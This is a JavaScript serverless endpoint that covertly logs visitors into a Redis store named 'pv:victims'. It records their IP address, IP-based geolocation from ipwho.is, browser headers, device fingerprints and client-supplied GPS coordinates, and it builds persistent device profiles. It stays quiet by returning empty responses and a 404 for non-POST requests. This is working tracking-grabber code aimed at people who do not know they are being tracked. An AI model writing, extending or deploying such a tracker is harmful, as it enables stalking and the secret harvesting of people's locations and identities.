const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || 'https://invalid.upstash.io',
  token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || 'invalid'
});

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') { return res.status(404).end(); }
  try {
    const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '0.0.0.0').split(',')[0].trim();
    const body = (req.body && typeof req.body === 'object') ? req.body : {};
    const id = String(body.x || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
    if (!id) { return res.status(204).end(); }

    const now = Date.now();
    let geo = null;
    const geoKey = 'pv:geo:' + ip.replace(/[^a-zA-Z0-9._-]/g, '_');
    const cached = await readJSON(geoKey);
    if (cached && typeof cached.ts === 'number' && now - cached.ts < (cached.data && cached.data.err ? 3600e3 : 604800e3)) {
      geo = cached.data;
    } else {
      geo = await lookupGeo(ip);
      if (geo) await writeJSON(geoKey, { ts: now, data: geo }, cached && cached.data && cached.data.err ? 3600 : 604800);
    }

    const prevRaw = await kv.hget('pv:victims', id);
    let prev = {};
    try { prev = prevRaw ? JSON.parse(prevRaw) : {}; } catch (e) { prev = {}; }

    const chModel = String(req.headers['sec-ch-ua-model'] || '').replace(/"/g, '').trim();
    const chPv = String(req.headers['sec-ch-ua-platform-version'] || '').replace(/"/g, '').trim();
    const fp = String(body.f || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
    const known = fp ? await readJSON('pv:dev:' + fp) : null;

    const h = {};
    const hk = ['sec-ch-ua', 'sec-ch-ua-platform', 'sec-ch-ua-mobile', 'accept-language', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'accept-encoding', 'x-vercel-id', 'accept'];
    for (const k of hk) { if (req.headers[k]) h[k] = String(req.headers[k]).slice(0, 300); }

    const rec = Object.assign({}, prev, body, { ts: new Date().toISOString(), ip: ip, geo: geo || null, h: h });
    if (!rec.hm && chModel) rec.hm = chModel;
    if (!rec.pv && chPv) rec.pv = chPv;
    if (known) {
      if (!rec.hm && known.hm) rec.hm = known.hm;
      if (!rec.y && known.y) rec.y = known.y;
      if (!rec.av && known.av) rec.av = known.av;
      if (!rec.os && known.os) rec.os = known.os;
      if (!rec.pv && known.pv) rec.pv = known.pv;
      if (!rec.app && known.app) rec.app = known.app;
      if (rec.glat == null && known.glat != null) { rec.glat = known.glat; rec.glon = known.glon; rec.gacc = known.gacc; }
    }

    const fields = {};
    fields[id] = JSON.stringify(rec);
    await kv.hset('pv:victims', fields);

    const changedDev = !known || known.hm !== rec.hm || known.y !== rec.y || known.os !== rec.os || known.app !== rec.app || (rec.glat != null && rec.glat !== known.glat);
    if (fp && changedDev && (rec.hm || rec.y || rec.os)) {
      await writeJSON('pv:dev:' + fp, {
        f: fp, hm: rec.hm || '', y: rec.y || '', av: rec.av || '', os: rec.os || '', pv: rec.pv || '', app: rec.app || '',
        glat: rec.glat != null ? rec.glat : null, glon: rec.glon != null ? rec.glon : null, gacc: rec.gacc != null ? rec.gacc : null, ts: rec.ts
      }, 2592000);
    }

    return res.status(204).end();
  } catch (e) {
    console.error('PXR_ERR', e && (e.stack || e.message || e));
    return res.status(204).end();
  }
};

async function readJSON(key) {
  try {
    const v = await kv.get(key);
    if (!v) return null;
    return typeof v === 'string' ? JSON.parse(v) : v;
  } catch (e) { console.error('PXR_READ_ERR', key, e && (e.message || e)); return null; }
}

async function writeJSON(key, value, ex) {
  try {
    const s = JSON.stringify(value);
    if (ex) await kv.set(key, s, { ex: ex });
    else await kv.set(key, s);
    return true;
  } catch (e) { console.error('PXR_WRITE_ERR', key, e && (e.message || e)); return false; }
}

async function lookupGeo(ip) {
  if (!ip || ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('127.') || ip.startsWith('192.168.')) return null;
  try {
    const r = await fetch('https://ipwho.is/' + ip);
    const j = await r.json();
    if (!j || j.success === false) return { err: 1 };
    return {
      lat: j.latitude !== undefined ? j.latitude : null,
      lon: j.longitude !== undefined ? j.longitude : null,
      city: j.city || '', region: j.region || '', country: j.country || '', zip: j.postal || '',
      isp: j.connection && j.connection.isp || '', org: j.connection && j.connection.org || '', asn: j.connection && j.connection.asn || ''
    };
  } catch (e) { return { err: 1 }; }
}
